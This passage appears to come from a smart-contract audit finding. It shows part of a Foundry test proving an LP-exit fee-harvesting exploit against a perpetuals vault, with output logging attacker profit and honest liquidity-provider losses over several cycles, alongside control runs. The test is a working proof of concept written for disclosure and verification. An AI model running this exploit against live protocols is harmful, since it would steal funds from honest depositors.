        uint256 claimableDeposit = juniorVault.claimableDepositRequest(depositId, UNRELATED_LP);
        vm.prank(UNRELATED_LP);
        uint256 unrelatedShares = juniorVault.claimDeposit(depositId, claimableDeposit, UNRELATED_LP, UNRELATED_LP);

        uint256 depthAtClose = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 poolBeforeClose = pool.accountedAssets();
        _closeAll(size);
        uint256 paidAtClose = poolBeforeClose - pool.accountedAssets();
        (,,,,,, int256 vpiAfter) = engine.positions(ATTACKER_TRADER);
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdraw(ATTACKER_TRADER, free);

        uint256 attackerAfter = _attackerTotalCash();
        uint256 honestAfter = _honestJuniorNav();
        uint256 unrelatedValue = juniorVault.convertToAssets(unrelatedShares);
        emit log_named_uint("depth at open (6dp)", depthAtOpen);
        emit log_named_uint("depth at close (6dp)", depthAtClose);
        emit log_named_int("VPI charged at open (6dp)", vpiPaid);
        emit log_named_uint("pool accountedAssets paid out at close", paidAtClose);
        emit log_named_int("position vpiAccrued after close", vpiAfter);
        emit log_named_int("ATTACKER delta (6dp)", int256(attackerAfter) - int256(attackerBefore));
        emit log_named_int("honest junior delta (6dp)", int256(honestAfter) - int256(honestBefore));
        emit log_named_int("unrelated new LP delta (6dp)", int256(unrelatedValue) - int256(depositAmount));
        assertEq(engine.lastMarkPrice(), MARK, "mark never moved");
        assertGt(attackerAfter, attackerBefore + 500e6, "attacker still profits with depth restored");
    }

}
```

Observed output (`-vv`, 5 tests):
```
Ran 5 tests for test/fresh/lead/LpVpiHarvestPublic.t.sol:LpVpiHarvestPublicTest
[PASS] test_Attack_DepthRestoredBeforeClose() (gas: 6002688)
  depth at open (6dp): 8002000000000
  depth at close (6dp): 8003222104597
  VPI charged at open (6dp): 5777216002
  pool accountedAssets paid out at close: 4553844708
  position vpiAccrued after close: 0
  ATTACKER delta (6dp): 2159302228
  honest junior delta (6dp): 238309173
  unrelated new LP delta (6dp): -3641543813
[PASS] test_Attack_LpExitBetweenOpenAndCloseHarvestsVpi() (gas: 5283548)
  position size (18dp): 3040700000000000000000000
  VPI charged at open (6dp): 5777216002
  pool accountedAssets delta at open: 5777216002
  attacker shares requested: 4002778071708183
  attacker shares funded   : 4002778071708183
  attacker LP exit assets: 4004555111405
  pool accountedAssets paid out at close: 4554729653
  mark before/after: 100000000
  honest junior NAV before: 999961651605
  honest junior NAV after : 996561168387
  attacker total before: 4199956157883
  attacker total after : 4202116345056
  HONEST JUNIOR LOSS (6dp): 3400483218
  ATTACKER PROFIT (6dp): 2160187173
[PASS] test_Attack_ThreeCyclesMinimalExposure() (gas: 16759939)
  ATTACK cycle: 1
    position open (seconds): 60
    attacker delta this cycle (6dp): 2144367330
    honest junior delta this cycle (6dp): -3439431140
  ATTACK cycle: 2
    position open (seconds): 60
    attacker delta this cycle (6dp): 2148981689
    honest junior delta this cycle (6dp): -3444243944
  ATTACK cycle: 3
    position open (seconds): 60
    attacker delta this cycle (6dp): 2153377394
    honest junior delta this cycle (6dp): -3448797351
  ATTACK elapsed seconds: 32400
  ATTACK attacker total delta (6dp): 6446726413
  ATTACK honest junior delta (6dp): -10332472435
  ATTACK honest redeems shares: 100066711073938
  ATTACK honest receives USDG (6dp): 98961833848
[PASS] test_Control_RoundTripWithoutLpExitLosesFees() (gas: 4343672)
  control: VPI charged at open (6dp): 5777216002
  control: honest junior NAV before: 999961651605
  control: honest junior NAV after : 1000201444631
  control: attacker total before: 4199956157883
  control: attacker total after : 4198472415736
[PASS] test_Control_ThreeCyclesSameTradesNoLpExit() (gas: 12780486)
  CONTROL cycle: 1
    position open (seconds): 60
    attacker delta this cycle (6dp): -1548270381
    honest junior delta this cycle (6dp): 222134185
  CONTROL cycle: 2
    position open (seconds): 60
    attacker delta this cycle (6dp): -1548504494
    honest junior delta this cycle (6dp): 222175870
  CONTROL cycle: 3
    position open (seconds): 60
    attacker delta this cycle (6dp): -1548696579
    honest junior delta this cycle (6dp): 222207922
  CONTROL elapsed seconds: 43201
  CONTROL attacker total delta (6dp): -4645471454
  CONTROL honest junior delta (6dp): 666517977
  CONTROL honest redeems shares: 100066711073938
  CONTROL honest receives USDG (6dp): 100061721087
Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 38.41ms (77.28ms CPU time)
Ran 1 test suite in 40.05ms (38.41ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```
